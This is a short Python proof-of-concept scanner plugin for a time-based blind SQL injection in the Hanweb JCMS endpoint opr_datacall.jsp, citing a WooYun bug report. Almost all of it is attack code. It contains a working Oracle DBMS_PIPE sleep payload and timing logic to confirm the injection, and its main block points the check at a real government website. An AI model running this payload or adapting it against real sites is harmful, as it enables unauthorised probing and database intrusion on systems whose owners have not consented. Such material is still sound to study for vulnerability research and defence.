#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  大汉jcms/lm/front/api/opr_datacall.jsp sql注入
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148625

"""

import time


def assign(service, arg):
    if service == "hanweb":
        return True, arg
        
def audit(arg):
    url = arg + "lm/front/api/opr_datacall.jsp?fn_billstatus=E&vc_id=1"
    payload = "%27%20AND%204683=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(104)||CHR(119)||CHR(98),5)%20AND%20%27OxYZ%27=%27OxYZ"
    url2 = url + payload
    time0 = time.time()
    code1, head, res, errcode, _ = curl.curl2(url)
    time1 = time.time()
    code2, head, res, errcode, _ = curl.curl2(url2)
    time2 = time.time()
    if code2 ==500 and code1 ==500 and ((time2 - time1) - (time1 - time0)) >= 4.5:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://www.yanjiao.gov.cn/')[1])